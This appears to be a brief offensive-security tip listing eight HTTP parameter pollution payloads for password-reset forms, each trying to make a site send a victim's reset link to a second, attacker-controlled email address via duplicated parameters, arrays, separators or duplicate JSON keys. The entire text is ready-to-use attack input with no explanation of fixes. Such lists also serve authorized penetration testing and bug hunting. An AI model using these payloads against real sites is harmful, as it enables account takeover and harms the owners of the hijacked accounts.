📢Parameter pollution on password reset

email=v@g.com&email=a@g.com
email[]=v@g.com&email[]=a@g.com
email=v@g.com%20email=a@g.com
email=v@g.com|email=a@g.com
email=v@g.com,a@g.com
email=v@g.com%20a@g.com
{"email":"v@g.com","email":"a@g.com"}
{"email":["v@g.com","a@g.com"]}


